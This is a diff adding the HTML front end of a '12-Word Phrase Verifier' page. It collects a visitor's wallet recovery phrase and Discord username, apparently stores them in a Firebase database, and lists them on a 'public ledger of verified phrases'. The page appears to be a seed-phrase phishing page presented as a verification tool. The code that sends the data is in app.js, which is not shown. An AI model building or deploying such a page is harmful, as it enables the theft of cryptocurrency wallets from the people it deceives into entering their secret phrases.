@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>12-Word Phrase Verifier</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle dark mode">
+            <span class="theme-icon">🌙</span>
+        </button>
+
+        <div class="content-wrapper">
+            <!-- Input Section -->
+            <section class="input-section">
+                <h1>Verify Your 12-Word Phrase</h1>
+                <p class="subtitle">Enter your recovery phrase words in order</p>
+
+                <form id="phraseForm">
+                    <!-- Discord Username Input -->
+                    <div class="discord-section">
+                        <label for="discordUsername">Discord Username *</label>
+                        <input
+                            type="text"
+                            id="discordUsername"
+                            placeholder="username#1234"
+                            required
+                            autocomplete="off"
+                        />
+                        <span class="error-message" id="discordError"></span>
+                    </div>
+
+                    <!-- Word Inputs Grid -->
+                    <div class="words-grid">
+                        <div id="wordsContainer"></div>
+                    </div>
+
+                    <!-- Validation Messages -->
+                    <div class="validation-message" id="validationMessage"></div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" class="submit-button" id="submitBtn">
+                        Verify Phrase
+                    </button>
+                </form>
+            </section>
+
+            <!-- Submissions List Section -->
+            <section class="submissions-section">
+                <h2>Verified Submissions</h2>
+                <p class="subtitle">Public ledger of verified phrases</p>
+
+                <div class="submissions-list" id="submissionsList">
+                    <div class="loading">Loading submissions...</div>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <!-- Firebase Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
